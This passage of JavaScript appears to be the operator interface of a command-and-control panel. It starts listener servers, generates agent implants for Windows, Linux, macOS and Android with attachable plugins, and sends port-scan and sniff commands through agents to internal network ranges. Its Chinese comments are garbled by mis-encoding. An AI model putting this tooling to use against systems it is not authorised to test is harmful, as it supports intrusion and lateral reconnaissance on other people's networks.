            return;
        }

        net_data.forEach((item) => {
            if (!item) {
                return;
            }
            const row = document.createElement("div");
            row.className = "net_div_son";
            row.style.display = "flex";
            row.style.justifyContent = "space-between";
            row.style.alignItems = "flex-start";
            row.style.gap = "12px";

            const contentDiv = document.createElement("div");
            contentDiv.style.flex = "1";

            const target = item.target || "";
            const title = document.createElement("div");
            title.textContent = target || "";
            contentDiv.appendChild(title);

            if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                const innetDiv = document.createElement("div");
                innetDiv.textContent = item.shell_innet.join(", ");
                contentDiv.appendChild(innetDiv);
            }

            row.appendChild(contentDiv);

            if (uid && target) {
                const button = document.createElement("button");
                button.type = "button";
                button.textContent = "remove";
                button.onclick = async () => {
                    try {
                        const result = await this.del_net(target, uid);
                        // 后端返回 200 才真正删除元素
                        if (result && result.code === 200 && result.uid === uid && result.taskid === AgentTaskId) {
                            customLog("delete shell innet:"+result.target);
                            row.remove();
                        } else {
                            customLog("delete shell innet failed:", result);
                        }
                    } catch (err) {
                        customLog("del shell innet error:", err);
                    }
                };
                row.appendChild(button);
            }
            netDiv.appendChild(row);
        });
    }
    async scan(){
        var uid = document.getElementById('net_shell').value;
        if (!uid) {
            customLog("Please select an agent");
            return false;
        }
        let optionValue = document.getElementById('net_options').value; //閫夐」
        let targetValue = document.getElementById('net_target').value; //鐩爣
        let targetListValue = document.getElementById('net_target_list').value; //鎺㈡祴鑼冨洿
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //浼戠湢鏃堕棿
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //鑷畾涔夋椂闂�
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 榛樿鏈€灏忓€间负1
        }

        if(optionValue === "scan"){
            var cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
        }else if(optionValue === "sniff"){
            var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
        } else {
            customLog("Please select scan type");
            return false;
        }
        const sent = await webSocketClient.send(
            "msg",
            {
                uid:uid,
                msg:cmd,
                taskid:AgentTaskId
            }
        );
        if (!sent) {
            customLog("Send failed");
            return false;
        }
        return true;
    }
    async del_net(target, uid) {
        const responsePromise = webSocketClient.waitForMessage(
            (msg) =>
                msg.path === "delShellInnet" &&
                msg.target === target &&
                msg.uid === uid &&
                msg.taskid === AgentTaskId
        );
        const sent = await webSocketClient.send(
            "delShellInnet",
            {
                uid: uid,
                target: target,
                taskid: AgentTaskId
            }
        );
        if (!sent) {
            throw new Error("send delShellInnet failed");
        }
        const result = await responsePromise;
        return result;
    }
    getshellip(shell_ip_data = null, uid = null){
        if (!uid) {
            const shellSelect = document.getElementById("net_shell");
            uid = shellSelect ? shellSelect.value : "";
        }
        try {
            if (!uid) {
                return;
            }
    
            if (shell_ip_data === null || typeof shell_ip_data === "undefined") {
                shell_ip_data =
                    (window.shellInnetData && window.shellInnetData[uid]) ||
                    [];
            }
    
            let shell_ip_list = [];
            if (Array.isArray(shell_ip_data)) {
                shell_ip_list = shell_ip_data;
            } else if (typeof shell_ip_data === "string") {
                shell_ip_list = shell_ip_data.split(",");
            } else if (shell_ip_data && typeof shell_ip_data === "object") {
                shell_ip_list = Object.values(shell_ip_data);
            } else if (shell_ip_data !== null && shell_ip_data !== undefined) {
                shell_ip_list = [String(shell_ip_data)];
            }
    
            const have_ip_div = document.getElementById("have_ip");
            if (!have_ip_div) {
                return;
            }
    
            have_ip_div.innerHTML = "";
    
            let cur_div = document.createElement("div");
            cur_div.textContent = "Host net:";
            have_ip_div.appendChild(cur_div);
    
            shell_ip_list.forEach(item => {
                if (!item) {
                    return;
                }
                let div = document.createElement("div");
                div.textContent = "IP: " + item;
                have_ip_div.appendChild(div);
            });
        } catch(err){
            console.error("get shell ip error:", err);
        }
    }
}

class lain_server {
    getOnlineTeammatesMarkup() {
        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
        const count = teamList.length;
        const listItems = count > 0 ?
            teamList.map((user) => {
                return "<li class='online-teammate-item'>" +
                    escapeHtml(user) +
                    "</li>";
            }).join("") :
            "<li class='online-teammate-empty'>No teammates online</li>";
        return (
            "<div id='online-teammates-card' class='online-teammates-card'>" +
                "<div class='online-teammates-head'>" +
                    "<div class='online-teammates-copy'>" +
                        "<div class='online-teammates-title'>Online teammates</div>" +
                        "<div class='online-teammates-subtitle'>Current teammates connected to the panel</div>" +
                    "</div>" +
                    "<div class='online-teammates-actions'>" +
                        "<span id='online-teammates-count' class='online-teammates-count'>" + count + "</span>" +
                        "<button type='button' class='online-teammates-action online-teammates-refresh'>Refresh</button>" +
                        "<button type='button' class='online-teammates-action online-teammates-toggle'>Show list</button>" +
                    "</div>" +
                "</div>" +
                "<div class='online-teammates-toolbar'>" +
                    "<button type='button' class='online-teammates-action online-teammates-action-strong' onclick='openStartServerDialog()'>Start server</button>" +
                    "<button type='button' class='online-teammates-action' onclick='clearMemory()'>Clear memory</button>" +
                    "<button type='button' class='online-teammates-action' onclick='downLog()'>Download log</button>" +
                "</div>" +
                "<div id='online-teammates-list' class='online-teammates-list'>" +
                    "<div class='online-teammates-list-label'>Teammate list</div>" +
                    "<ul class='online-teammates-list-body'>" + listItems + "</ul>" +
                "</div>" +
            "</div>"
        );
    }
    renderOnlineTeammatesCard() {
        const mountNode = document.getElementById("online_teammates_mount");
        if (!mountNode) {
            return;
        }
        const card = mountNode.querySelector("#online-teammates-card");
        if (!card) {
            mountNode.innerHTML = this.getOnlineTeammatesMarkup();
            return;
        }
        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
        const countNode = card.querySelector("#online-teammates-count");
        const listNode = card.querySelector("#online-teammates-list ul");
        const toggleBtn = card.querySelector(".online-teammates-toggle");
        if (countNode) {
            countNode.textContent = String(teamList.length);
        }
        if (listNode) {
            listNode.innerHTML = teamList.length > 0 ?
                teamList.map((user) => {
                    return "<li class='online-teammate-item'>" +
                        escapeHtml(user) +
                        "</li>";
                }).join("") :
                "<li class='online-teammate-empty'>No teammates online</li>";
        }
        const listPanel = card.querySelector("#online-teammates-list");
        if (listPanel && toggleBtn && listPanel.style.display === "none") {
            toggleBtn.textContent = "Show list";
        }
    }
    async requestOnlineTeammates() {
        try {
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => {
                    return msg.path === "onlineteamment" && msg.code === 200
                }
            );
            const sent = await webSocketClient.send(
                "onlineteamment",
                {}
            );
            if (!sent) {
                customLog("Failed to request online teammates");
                return false;
            }
            const result = await responsePromise;
            onlineTeammates = Array.isArray(result.data) ? result.data : [];
            window.onlineTeammates = onlineTeammates;
            this.renderOnlineTeammatesCard();
            return true;
        } catch (err) {
            console.error("online teammates error:", err);
            customLog("Failed to load online teammates");
            return false;
        }
    }
    async clear_memory(){
        try{
            let result = await webSocketClient.send(
                
                "cleanup",
                {}
            );
            console.log(
                "cleanup success:",
                result
            );
        }catch(err){
            console.error(
                "cleanup error:",
                err
            );
        }
    }
    async start_server() {
        const form = document.getElementById("serverForm");
        if (!form) {
            customAlert("Server form not found");
            return false;
        }
        const formData = new FormData(form);
        const jsonData = {};
        const certContent = formData.get("cert") || "";
        const keyContent = formData.get("key") || "";
        formData.forEach((value, key) => {
            if(
                key !== "cert" &&
                key !== "key"
            ){
                jsonData[key] = value;
            }
        });
        jsonData.cert = certContent;
        jsonData.key = keyContent;
        // 娣诲姞鐢ㄦ埛鍚�
        jsonData.username = Username;
        try{
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => {
                    return msg.path === "startServer";
                }
            );
            const sent = await webSocketClient.send(
                "startServer",
                jsonData
            );
            if (!sent) {
                customAlert("Start server send failed");
                return false;
            }
            const result = await responsePromise;
            if (!result || result.code !== 200) {
                customAlert(
                    (result && result.message) ||
                    "Start server failed"
                );
                return false;
            }
            customLog(
                result.message ||
                ("Server started on port " + (result.port || ""))
            );
            return true;
        }catch(err){
            console.error("start server error:",err);
            customAlert("Start server failed: " + err.message);
            return false;
        }
    }

    updateServerIndex() {
        if (!Array.isArray(server_data)) {
            console.error("server_data is not an array");
            return;
        }
        this.renderOnlineTeammatesCard();
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;
        let htmlContent = "";
        for (const server of server_data) {
            const keyPathRaw = String(server.keyPath || "");
            const certPathRaw = String(server.certPath || "");
            const key_path = keyPathRaw.length > 22 ? keyPathRaw.substring(0, 22) + "..." : keyPathRaw;
            const cert_path = certPathRaw.length > 22 ? certPathRaw.substring(0, 22) + "..." : certPathRaw;
            const clientCount = serverClientCounts[String(server.port)] || 0;
            htmlContent += "<article id='" + escapeHtml(server.port) + "-info' class='server-card'>";
                htmlContent += "<div class='server-card-head'>";
                    htmlContent += "<div class='server-card-copy'>";
                        htmlContent += "<div class='server-card-title'>" + escapeHtml(server.remark || "Unnamed server") + "</div>";
                        htmlContent += "<div class='server-card-subtitle'>" + escapeHtml(server.path || "/") + "</div>";
                    htmlContent += "</div>";
                    htmlContent += "<div class='server-card-badges'>";
                        htmlContent += "<span class='server-badge'>" + escapeHtml(String(server.protocol || "").toUpperCase()) + "</span>";
                        htmlContent += "<span class='server-badge server-badge-accent'><span id='" + escapeHtml(server.port) + "'>" + clientCount + "</span> agents</span>";
                    htmlContent += "</div>";
                htmlContent += "</div>";
                htmlContent += "<div class='server-meta-grid'>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Port</span><span class='server-meta-value'>" + escapeHtml(server.port) + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>User</span><span class='server-meta-value'>" + escapeHtml(server.username) + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Cert</span><span class='server-meta-value'>" + escapeHtml(cert_path || "-") + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Key</span><span class='server-meta-value'>" + escapeHtml(key_path || "-") + "</span></div>";
                htmlContent += "</div>";
                htmlContent += "<div class='server-action-groups'>";
                    htmlContent += "<div class='server-action-row'>";
                if (server.windows_pro === "group_pro") {
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
                } else {
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "'>Linux agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "'>macOS agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "'>Android agent</a>";
                }
                    htmlContent += "</div>";
                    htmlContent += "<div class='server-action-row server-action-row-secondary'>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary download-config' href='javascript:void(0)' data-port='" + server.port + "'>Download config</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary modifyServerHeader' href='javascript:void(0)' data-port='" + server.port + "'>Headers</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary plugin' href='javascript:void(0)' data-port='" + server.port + "' style='top: 30%;'>Plugins</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-danger delete-server' href='javascript:void(0)' data-port='" + server.port + "'>Delete</a>";
                    htmlContent += "</div>";
                htmlContent += "</div>";
            htmlContent += "</article>";
        }
        serverIndexDiv.innerHTML = htmlContent;
    }
    async initServerIndexClickHandler() {
        const serverPage = document.getElementById('server');
        if (!serverPage) return;
        if (serverPage.dataset.clickBound === "true") {
            return;
        }
        serverPage.dataset.clickBound = "true";
        serverPage.addEventListener('click', async (event) => {
            const target = event.target;
            if (target.classList.contains('online-teammates-refresh')) {
                await this.requestOnlineTeammates();
                return;
            }
            if (target.classList.contains('online-teammates-toggle')) {
                const card = target.closest("#online-teammates-card");
                const listPanel = card ? card.querySelector("#online-teammates-list") : null;
                if (!listPanel) {
                    return;
                }
                const expanded = listPanel.style.display === "block";
                listPanel.style.display = expanded ? "none" : "block";
                target.textContent = expanded ? "Show list" : "Hide list";
                return;
            }
            if (target.classList.contains('delete-server')) {
                const port = target.getAttribute('data-port');
                try {
                    const confirmed = await customConfirm("confirm?");
                    if (!confirmed) {
                        return;
                    }

                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => {
                            return msg.path === "delserver" &&
                                msg.code === 200 &&
                                msg.port === port &&
                                msg.taskid === AgentTaskId;
                        },
                    );

                    const sent = await webSocketClient.send(
                        "delserver",
                        {
                            port: port,
                            taskid: AgentTaskId
                        }
                    );

                    if (!sent) {
                        customAlert("Delete server send failed");
                        return;
                    }

                    const data = await responsePromise;
                    if (!data || data.code !== 200 || data.port !== port || data.taskid !== AgentTaskId) {
                        customAlert(
                            (data && data.message) ||
                            "Delete server failed"
                        );
                        return;
                    }

                    server_data = Array.isArray(server_data)
                        ? server_data.filter(s => s.port !== port)
                        : [];

                    const serverDiv = document.getElementById(port + "-info");
                    if (serverDiv) {
                        serverDiv.remove();
                    }

                    customLog(data.message || "Server deleted");
                } catch(err) {
                    console.error("delete server error:", err);
                    customAlert("Delete server failed: " + err.message);
                }
            }
            if (target.classList.contains('download-config')) {
                const port = target.getAttribute('data-port');
                this.downloadConfig(port);
            }
            if (target.classList.contains('modifyServerHeader')) {
                const port = target.getAttribute('data-port');
                this.modifyServerHeader(port);
            }
            if (target.classList.contains('agent-link')) {
                const os = target.getAttribute('data-os');
                const port = target.getAttribute('data-port');
                if (!Array.isArray(server_data)) {
                    console.error("server_data is null", server_data);
                    return;
                }
                const server = server_data.find(s => s.port === port);
                if (!server) return;
                const path = server.path.replace(/^\//, "");
                let code = "";
                if (Array.isArray(server_plugin)) {
                    const matchedPlugins = server_plugin.filter(function(pluginItem) {
                        if (!pluginItem) {
                            return false;
                        }
                        const pluginRemark = String(
                            pluginItem.remark || pluginItem.Remark || ""
                        );
                        const pluginOS = String(
                            pluginItem.os || pluginItem.OS || ""
                        ).toLowerCase();
                        const pluginCode = pluginItem.code || pluginItem.Code || "";
                        return pluginRemark === String(server.remark || "") &&
                            pluginOS === String(os || "").toLowerCase() &&
                            typeof pluginCode === "string" &&
                            pluginCode.trim() !== "";
                    });
                    code = matchedPlugins
                    .map(function(pluginItem) {
                        return pluginItem.code || pluginItem.Code || "";
                    })
                    .join("\n\n")
                    .trim();
                }
                if (!code) {
                    code = "/*code*/";
                }
                // 鎸� redirectToAgentCode 鐨勫弬鏁伴『搴忚皟鐢紙protocol, os, server, path, ... , code, windows_pro锛�
                this.redirectToAgentCode(
                    server.protocol,
                    os,
                    main_server+":"+server.port,
                    path,
                    server.conn_path,
                    server.msg_path,
                    server.switch_path,
                    server.encry_path,
                    server.download_path,
                    server.result_path,
                    server.net_path,
                    server.info_path,
                    server.upload_path,
                    server.list_path,
                    server.option_path,
                    server.uid,
                    server.hostname,
                    server.keyPart,
                    server.filekey,
                    code,
                    server.windows_pro
                );
            }
            if (target.classList.contains('plugin')) {
                const port = target.getAttribute('data-port');
                const server = server_data.find(s => s.port === port);
                if (!server) return;
                let dialog = document.getElementById("pluginDialog");
                if (!dialog) {
                    dialog = document.createElement("div");
                    dialog.id = "pluginDialog";
                    dialog.className = "serverDialog";
                    dialog.style.left = "50%";
                    dialog.style.display = "block";
                    dialog.dataset.remark = server.remark;

                    dialog.innerHTML =
                        "<div class='plugin-dialog-header'>" +
                            "<button type='button' class='plugin-close-btn' onclick='closePluginDialog()' aria-label='close plugin dialog'>x</button>" +
                            "<h3>plugin</h3>" +
                        "</div>" +
                        "<form id='pluginForm' method='POST' class='plugin-form'>" +
                        "<select id='select_os'>" +
                            "<option value='win'>windows</option>" +
                            "<option value='linux'>linux</option>" +
                            "<option value='macos'>macos</option>" +
                            "<option value='android'>android</option>" +
                        "</select><br>" +
                        "<input name='codeWord' placeholder='codeWord'><br>" +
                        "<div id='parameterContainer'>" +
                            "<span>Parameter count: <span id='parameterCount'>1</span></span>" +
                            "<button type='button' id='addParameterBtn'>+</button>" +
                            "<button type='button' id='removeParameterBtn'>-</button>" +
                            "<input type='hidden' name='parameter' id='parameterHidden' value='1' />" +
                        "</div>" +
                        "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                        "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
                        "<button type='button' id='submitBtn'>plugin</button>" +
                        "</form>" +
                        "<div id='plugin_list' class='plugin_list'></div>";

                    document.body.appendChild(dialog);
                    requestAnimationFrame(() => {
                        dialog.style.transform = "translateX(-50%) scaleY(1)";
                        dialog.style.opacity = "1";
                    });

                    // 缁戝畾鍙傛暟鍔犲噺鎸夐挳浜嬩欢锛堥娆″垱寤烘椂锛�
                    const addBtn = dialog.querySelector('#addParameterBtn');
                    const removeBtn = dialog.querySelector('#removeParameterBtn');
                    const countDisplay = dialog.querySelector('#parameterCount');
                    const countHidden = dialog.querySelector('#parameterHidden');
                    const pluginForm = dialog.querySelector('#pluginForm');
                    const submitBtn = dialog.querySelector('#submitBtn');

                    if (pluginForm) {
                        pluginForm.onsubmit = function(event) {
                            event.preventDefault();
                        };
                    }
                    if (submitBtn) {
                        submitBtn.onclick = function() {
                            submitPlugin();
                        };
                    }

                    if (addBtn && removeBtn && countDisplay && countHidden) {
                        addBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count < 20) {
                                count++;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                        removeBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count > 1) {
                                count--;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                    }
                    this.refreshPluginList();
                } else {
                    dialog.style.display = "block";
                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                    dialog.style.opacity = "1";
                    if (dialog.dataset.remark !== server.remark) {
                        dialog.dataset.remark = server.remark;
                        this.refreshPluginList();
                    }
                }
            }
        });
    }

    refreshPluginList() {
        const serverUi = this;
        var pluginList = document.getElementById("plugin_list");
        if (!pluginList) return;
        var dialog = document.getElementById("pluginDialog");
        var currentRemark = dialog ? dialog.dataset.remark : "";
        pluginList.innerHTML = "";
        pluginList.classList.add("plugin-panel");
        if (
            !Array.isArray(server_plugin) ||
            server_plugin.length === 0
        ) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }
        var pluginItems = server_plugin.filter(function(item) {
            if (!item) {
                return false;
            }
            if (!currentRemark) {
                return true;
            }
            return String(item.remark || item.Remark || "") === String(currentRemark);
        });
        if (pluginItems.length === 0) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }
        var validItems = pluginItems.filter(function(item) {
            var codeStr = item.code || item.Code || "";
            return codeStr && codeStr !== "/*code*/";
        });
        if (validItems.length === 0) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }

        var section = document.createElement("div");
        section.id = "plugin_section";
        section.className = "plugin-section";
        pluginList.appendChild(section);

        var title = document.createElement("h3");
        title.className = "plugin-section-title";
        title.textContent = "Plugin Library";
        section.appendChild(title);

        var osLabels = {
            win: "Windows",
            linux: "Linux",
            macos: "macOS",
            android: "Android",
            unknown: "Other"
        };
        var grouped = {};
        validItems.forEach(function(item) {
            var key = String(item.os || item.OS || "unknown").toLowerCase();
            if (!grouped[key]) {
                grouped[key] = [];
            }
            grouped[key].push(item);
        });

        ["win", "linux", "macos", "android", "unknown"].forEach(function(osKey) {
            if (!grouped[osKey] || grouped[osKey].length === 0) {
                return;
            }
            var groupCard = document.createElement("div");
            groupCard.className = "plugin-os-group";

            var groupHeader = document.createElement("div");
            groupHeader.className = "plugin-os-header";

            var osBadge = document.createElement("span");
            osBadge.className = "plugin-os-badge plugin-os-" + osKey;
            osBadge.textContent = osLabels[osKey] || osKey;

            var osCount = document.createElement("span");
            osCount.className = "plugin-os-count";
            osCount.textContent = grouped[osKey].length + " plugin" + (grouped[osKey].length > 1 ? "s" : "");

            var groupTools = document.createElement("div");
            groupTools.className = "plugin-os-tools";
            groupTools.appendChild(osCount);

            groupHeader.appendChild(osBadge);
            groupHeader.appendChild(groupTools);
            groupCard.appendChild(groupHeader);

            var groupList = document.createElement("div");
            groupList.className = "plugin-os-list";

            grouped[osKey].forEach(function(item) {
                var codeStr = item.code || item.Code || "";
                var codeWord = item.codeWord || item.CodeWord || "unnamed";
                var parameters = item.parameter || item.Parameter || [];
                var parameterDesc = item.parameter_desc || item.ParameterDesc || [];
                var pluginItem = document.createElement("article");
                pluginItem.className = "plugin-item";

                var itemTop = document.createElement("div");
                itemTop.className = "plugin-item-top";

                var meta = document.createElement("div");
                meta.className = "plugin-item-meta";

                var codeWordTag = document.createElement("span");
                codeWordTag.className = "plugin-codeword";
                codeWordTag.textContent = codeWord;

                var metaText = document.createElement("div");
                metaText.className = "plugin-meta-text";

                var paramText = document.createElement("div");
                paramText.className = "plugin-param-line";
                paramText.textContent = Array.isArray(parameters) && parameters.length > 0 ?
                    "Params: " + parameters.join(", ") :
                    "Params: none";

                var descText = document.createElement("div");
                descText.className = "plugin-desc-line";
                descText.textContent = Array.isArray(parameterDesc) && parameterDesc.length > 0 ?
                    "Desc: " + parameterDesc.join(", ") :
                    "Desc: not set";

                metaText.appendChild(paramText);
                metaText.appendChild(descText);
                meta.appendChild(codeWordTag);
                meta.appendChild(metaText);

                var actions = document.createElement("div");
                actions.className = "plugin-item-actions";

                var toggleBtn = document.createElement("button");
                toggleBtn.type = "button";
                toggleBtn.className = "plugin-toggle-btn";
                toggleBtn.textContent = "Expand";

                var copyBtn = document.createElement("button");
                copyBtn.type = "button";
                copyBtn.className = "plugin-copy-btn";
                copyBtn.textContent = "Copy";
                copyBtn.onclick = function() {
                    navigator.clipboard
                    .writeText(codeStr)
                    .then(function() {
                        copyBtn.textContent = "Copied";
                        setTimeout(function() {
                            copyBtn.textContent = "Copy";
                        }, 1000);
                    })
                    .catch(function(err) {
                        console.error("copy plugin failed:", err);
                    });
                };

                var deleteBtn = document.createElement("button");
                deleteBtn.type = "button";
                deleteBtn.className = "plugin-delete-btn";
                deleteBtn.textContent = "Delete";
                deleteBtn.onclick = function() {
                    serverUi.deletePlugin(currentRemark, osKey, codeWord);
                };

                actions.appendChild(toggleBtn);
                actions.appendChild(copyBtn);
                actions.appendChild(deleteBtn);

                itemTop.appendChild(meta);
                itemTop.appendChild(actions);

                var codePreview = document.createElement("pre");
                codePreview.className = "plugin-code-preview";
                codePreview.textContent = codeStr;
                if (codeStr.length > 220 || codeStr.indexOf("\n") !== -1) {
                    codePreview.classList.add("collapsed");
                } else {
                    toggleBtn.style.display = "none";
                }

                toggleBtn.onclick = function() {
                    var expanded = codePreview.classList.toggle("expanded");
                    toggleBtn.textContent = expanded ? "Collapse" : "Expand";
                };

                pluginItem.appendChild(itemTop);
                pluginItem.appendChild(codePreview);
                groupList.appendChild(pluginItem);
            });

            groupCard.appendChild(groupList);
            section.appendChild(groupCard);
        });
    }
    async deletePlugin(remark, osName, codeWords) {
        if (!remark || !osName || !codeWords) {
            customAlert("remark, os or codeWords is missing");
            return false;
        }
        const confirmed = await customConfirm(
            "Delete plugin " + codeWords + " for " + remark + " / " + osName + " ?"
        );
        if (!confirmed) {
            return false;
        }
        try {
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => msg.path === "delPlugin" && msg.remark === remark
            );
            const sent = await webSocketClient.send("delPlugin", {
                remark: remark,
                os: osName,
                codeWords: codeWords
            });
            if (!sent) {
                customAlert("delPlugin send failed");
                return false;
            }
            const data = await responsePromise;
            if (data && data.code === 200 && data.remark === remark) {
                customLog("delPlugin success:", data);
                return true;
            } else {
                customAlert(data?.message || "delPlugin failed");
                return false;
            }
        } catch (err) {
            console.error("delPlugin error:", err);
            customAlert("delPlugin failed");
            return false;
        }
    }

    async modifyServerHeader(port) {
        try {
            const server = Array.isArray(server_data) ?
                server_data.find((item) => String(item.port) === String(port)) :
                null;
            const currentHeader = server ?
                (server.response_head || server.responseHead || server.ResponseHead || "") :
                "";
            // 妫€鏌ユ槸鍚﹀凡鍔犺浇鏍峰紡
            if (!document.getElementById("modify-server-style")) {
                const styleLink = document.createElement("link");
                styleLink.id = "modify-server-style";
                styleLink.rel = "stylesheet";
                document.head.appendChild(styleLink);
            }
            // 鍒涘缓寮瑰嚭妗�
            const dialog = document.createElement("div");
            dialog.id = "modify-server-dialog";
            const closeButton = document.createElement("button");
            closeButton.type = "button";
            closeButton.className = "dialog-close-btn modify-server-close-btn";
            closeButton.textContent = "x";
            closeButton.setAttribute("aria-label", "Close response header dialog");
            closeButton.onclick = () => {
                document.body.removeChild(dialog);
            };
            dialog.appendChild(closeButton);
            // 鏍囬
            const title = document.createElement("h3");
            title.textContent = "Edit Response Header (JSON)";
            dialog.appendChild(title);
            // 鏂囨湰妗�
            const textarea = document.createElement("textarea");
            textarea.placeholder = "{\n  \"Content-Type\": \"application/json\",\n  \"Cache-Control\": \"no-cache\"\n}";
            if (currentHeader) {
                try {
                    const parsedHeader = JSON.parse(currentHeader);
                    textarea.value = JSON.stringify(parsedHeader, null, 2);
                } catch (e) {
                    textarea.value = currentHeader;
                }
            }
            dialog.appendChild(textarea);
            // 鎸夐挳瀹瑰櫒
            const buttonContainer = document.createElement("div");
            buttonContainer.className = "button-container";
            // 淇濆瓨鎸夐挳
            const saveButton = document.createElement("button");
            saveButton.textContent = "Save";
            saveButton.onclick = async () => {
                const newHeader = textarea.value.trim();
                if (newHeader !== "") {
                    try {
                        const parsedHeader = JSON.parse(newHeader);
                        if (!parsedHeader || Array.isArray(parsedHeader) || typeof parsedHeader !== "object") {
                            customAlert("Header must be a JSON object");
                            return;
                        }
                    } catch (err) {
                        customAlert("Invalid JSON format. Please check your input.");
                        console.error("Error modifying server header:", err);
                        return;
                    }
                }
                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => {
                            return msg.path === "changeResponseHead" &&
                                String(msg.port || "") === String(port)
                        },
                    );
                    const sent = await webSocketClient.send(
                        "changeResponseHead",
                        {
                            port: port,
                            response_head: newHeader
                        }
                    );
                    if (!sent) {
                        customLog("Send failed");
                        return;
                    }
                    const result = await responsePromise;
                    if (!result || result.code !== 200) {
                        customLog(
                            result && result.message ?
                                result.message :
                                "Modify response header failed"
                        );
                        return;
                    }
                    if (server) {
                        server.response_head = newHeader;
                        server.responseHead = newHeader;
                        server.ResponseHead = newHeader;
                    }
                    customLog(
                        newHeader === "" ?
                            "Response header cleared successfully!" :
                            "Response header modified successfully!"
                    );
                    document.body.removeChild(dialog);
                } catch (err) {
                    customAlert("Modify response header failed");
                    console.error("Error modifying server header:", err);
                }
            };
            buttonContainer.appendChild(saveButton);

            dialog.appendChild(buttonContainer);
            document.body.appendChild(dialog);
        } catch (err) {
            console.error("Error modifying server header:", err);
        }
    }

    // 涓嬭浇閰嶇疆
    downloadConfig(port) {
        // 鏍规嵁 port 鎵惧埌瀵瑰簲鐨� server
        const server = server_data.find(server => server.port === port);
        if (!server) {
            customLog("Server not found for port: " + port);
            return;
        }
        // 杞崲涓� JSON 瀛楃涓�
        const configData = JSON.stringify(server, null, 4);
        // 鍒涘缓 Blob 瀵硅薄
        const blob = new Blob([configData], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        // 鍒涘缓涓嬭浇閾炬帴
        const a = document.createElement("a");
        a.href = url;
        a.download = "server_config_" + port + ".json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        // 閲婃斁 URL
        URL.revokeObjectURL(url);
    }
    async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,
        download,result,net,info,upload,list,option,uid,hostname,keyPart,filekey,code,windows_pro){
        try {
            console.log(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,uid,hostname,keyPart,filekey,code,windows_pro);
            webSocketClient.send(
                "agentcode",
                {
                    protocol: protocol,
                    os: os,
                    server: server,
                    Path: path,
                    ConnPath: connPath,
                    MsgPath: msgPath,
                    switch_key: switch_key,
                    encry_key: encry_key,
                    download: download,
                    result: result,
                    net: net,
                    info: info,
                    upload: upload,
                    list: list,
                    option: option,
                    username:Username,
                    uid:uid,
                    hostname:hostname,
                    keyPart:keyPart,
                    filekey:filekey,
                    code:code,
                    group_pro:windows_pro || ""
                }
            );
        }catch(e){
            console.error(
                "generate agent code failed",
                e
            );
        }
    }
    checkAgent(data) {
        rebuildServerClientCounts(data);
    }
}

class lain_chat{
    renderChatItem(data) {
        console.log("renderChatItem:", data);
        if (!data) return;
        // 濡傛灉浼犲叆鐨勬槸鎺ュ彛瀹屾暣杩斿洖 {data: []}

        // 涓嬮潰寮€濮嬪鐞嗗崟鏉℃秷鎭�
        let chat_div = document.getElementById("chat_div");
        if (!chat_div) return;
    
        let div = document.createElement("div");
        div.className = "chat_message";
        div.setAttribute("data-chatid", data.chatid);
    
        // 鑷繁鐨勬秷鎭�
        if (data.username === Username) {
            div.classList.add("me");
        }
    
        // 澶撮儴
        let header = document.createElement("div");
        header.style.display = "flex";
        header.style.justifyContent = "space-between";
        header.style.alignItems = "center";
    
        let usernameSpan = document.createElement("strong");
        usernameSpan.innerText = data.username;
    
        header.appendChild(usernameSpan);
    
        // 鍙湁鑷繁鐨勬秷鎭樉绀哄垹闄ゆ寜閽�
        if (data.username === Username) {
            let delBtn = document.createElement("span");
